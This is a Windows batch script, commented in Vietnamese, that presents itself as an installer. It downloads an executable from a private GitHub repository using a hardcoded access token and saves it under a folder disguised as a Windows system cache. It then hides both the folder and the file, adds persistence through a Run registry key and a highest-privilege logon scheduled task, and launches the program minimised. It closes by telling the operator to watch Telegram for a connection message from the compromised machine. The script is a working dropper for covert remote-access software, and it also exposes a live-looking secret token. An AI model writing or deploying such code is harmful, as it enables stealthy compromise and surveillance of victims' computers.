@echo off
REM ========================================
REM INSTALLER TỰ ĐỘNG - FILE .EXE
REM ========================================
REM File này sẽ tự động:
REM 1. Tải file .exe từ GitHub
REM 2. Di chuyển vào thư mục ẩn
REM 3. Ẩn file và thư mục
REM 4. Thêm vào Windows Startup
REM 5. Khởi động ứng dụng
REM ========================================

chcp 65001 >nul 2>&1
cls
echo ========================================
echo    CAI DAT TU DONG - FILE .EXE
echo ========================================
echo.

REM ========================================
REM CẤU HÌNH GITHUB - THAY ĐỔI Ở ĐÂY
REM ========================================
set "GITHUB_USER=truongxoantit"
set "GITHUB_REPO=TLe1"
set "GITHUB_TOKEN=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"
set "EXE_FILENAME=System32Cache.exe"
REM ========================================

REM Kiểm tra quyền Administrator
net session >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Can quyen Administrator!
    echo Vui long chay file nay bang quyen Administrator.
    echo.
    pause
    exit /b 1
)
echo [OK] Co quyen Administrator
echo.

REM Thư mục cài đặt
set "INSTALL_DIR=%APPDATA%\Microsoft\Windows\System32Cache"

REM Tạo thư mục cài đặt
echo [1/5] Dang tao thu muc cai dat...
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%" >nul 2>&1
    if errorlevel 1 (
        echo [ERROR] Khong the tao thu muc!
        pause
        exit /b 1
    )
)
echo [OK] Thu muc: %INSTALL_DIR%
echo.

REM Dừng process cũ nếu có
echo [2/5] Dang kiem tra process cu...
tasklist /FI "IMAGENAME eq System32Cache.exe" 2>nul | find /I "System32Cache.exe" >nul
if not errorlevel 1 (
    echo [INFO] Tim thay process cu, dang dong...
    taskkill /F /IM System32Cache.exe >nul 2>&1
    timeout /t 2 >nul 2>&1
)
echo [OK] Khong co process cu
echo.

REM Tải file .exe từ GitHub
echo [3/5] Dang tai file .exe tu GitHub...
cd /d "%INSTALL_DIR%"

REM Xóa file cũ nếu có
if exist "%EXE_FILENAME%" (
    attrib -h -s -r "%EXE_FILENAME%" >nul 2>&1
    del /f /q "%EXE_FILENAME%" >nul 2>&1
)

REM Tải file mới
echo Dang tai %EXE_FILENAME%...
curl -L -H "Authorization: token %GITHUB_TOKEN%" ^
    -H "Accept: application/octet-stream" ^
    -o "%EXE_FILENAME%.tmp" ^
    "https://api.github.com/repos/%GITHUB_USER%/%GITHUB_REPO%/releases/latest" 2>"%INSTALL_DIR%\curl_error.log"

REM Nếu không có release, thử tải trực tiếp từ raw
if errorlevel 1 (
    echo [INFO] Thu tai truc tiep tu raw...
    curl -L -H "Authorization: token %GITHUB_TOKEN%" ^
        -o "%EXE_FILENAME%.tmp" ^
        "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/dist/%EXE_FILENAME%" 2>"%INSTALL_DIR%\curl_error.log"
)

if errorlevel 1 (
    echo [ERROR] Khong the tai file .exe!
    if exist "%INSTALL_DIR%\curl_error.log" (
        echo Chi tiet loi:
        type "%INSTALL_DIR%\curl_error.log"
    )
    pause
    exit /b 1
)

if not exist "%EXE_FILENAME%.tmp" (
    echo [ERROR] File .exe khong ton tai sau khi tai!
    pause
    exit /b 1
)

REM Kiểm tra kích thước file (ít nhất 1MB)
for %%f in ("%EXE_FILENAME%.tmp") do (
    if %%~zf LSS 1048576 (
        echo [ERROR] File .exe qua nho, co the bi loi!
        type "%EXE_FILENAME%.tmp"
        del /f /q "%EXE_FILENAME%.tmp" >nul 2>&1
        pause
        exit /b 1
    )
)

REM Đổi tên file tạm thành file chính
move /y "%EXE_FILENAME%.tmp" "%EXE_FILENAME%" >nul 2>&1
if not exist "%EXE_FILENAME%" (
    echo [ERROR] Khong the tao file .exe!
    pause
    exit /b 1
)

echo [OK] Da tai file .exe thanh cong
echo.

REM Ẩn file và thư mục
echo [4/5] Dang an file va thu muc...
attrib +h +s "%INSTALL_DIR%" >nul 2>&1
attrib +h +s "%EXE_FILENAME%" >nul 2>&1
echo [OK] Da an file va thu muc
echo.

REM Thêm vào Windows Startup
echo [5/5] Dang them vao Windows Startup...

REM Thêm vào Registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "System32Cache" /t REG_SZ /d "\"%INSTALL_DIR%\%EXE_FILENAME%\"" /f >nul 2>&1
if errorlevel 1 (
    echo [WARNING] Khong the them vao Registry, thu Task Scheduler...
) else (
    echo [OK] Da them vao Registry Startup
)

REM Thêm vào Task Scheduler (backup)
schtasks /Create /TN "System32Cache" /TR "\"%INSTALL_DIR%\%EXE_FILENAME%\"" /SC ONLOGON /F /RL HIGHEST >nul 2>&1
if not errorlevel 1 (
    echo [OK] Da them vao Task Scheduler
)
echo.

REM Khởi động ứng dụng
echo Dang khoi dong ung dung...
start "" /min "%INSTALL_DIR%\%EXE_FILENAME%"
timeout /t 3 >nul 2>&1

REM Kiểm tra process đang chạy
tasklist /FI "IMAGENAME eq System32Cache.exe" 2>nul | find /I "System32Cache.exe" >nul
if not errorlevel 1 (
    echo [OK] Ung dung da duoc khoi dong thanh cong!
) else (
    echo [WARNING] Khong tim thay process, co the ung dung chua khoi dong
)

echo.
echo ========================================
echo    CAI DAT HOAN TAT!
echo ========================================
echo.
echo Thu muc cai dat: %INSTALL_DIR%
echo File: %EXE_FILENAME%
echo.
echo Ung dung da duoc them vao Windows Startup
echo Ung dung se tu dong chay khi may khoi dong.
echo.
echo Kiem tra Telegram de xem thong bao ket noi tu may nay.
echo.
pause

